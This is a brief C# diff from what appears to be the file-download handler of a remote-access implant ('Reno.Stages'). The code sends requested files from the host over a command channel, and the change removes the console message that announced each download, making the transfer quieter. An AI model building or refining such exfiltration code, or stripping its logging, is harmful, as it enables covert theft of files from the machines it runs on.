@@ -88,7 +88,6 @@ namespace Reno.Stages
                     case CommChannel.DOWNLOAD:
                         byte[] fileToDownload = channel.Decompress(channel.ReceiveBytes(header.DataLength));
                         string fileDownload = GetFullPath(Encoding.UTF8.GetString(fileToDownload));
-                        Console.WriteLine("[*] Asked to download {0}", fileDownload);
                         // Get the file and transmit
                         if (File.Exists(fileDownload))
                         {
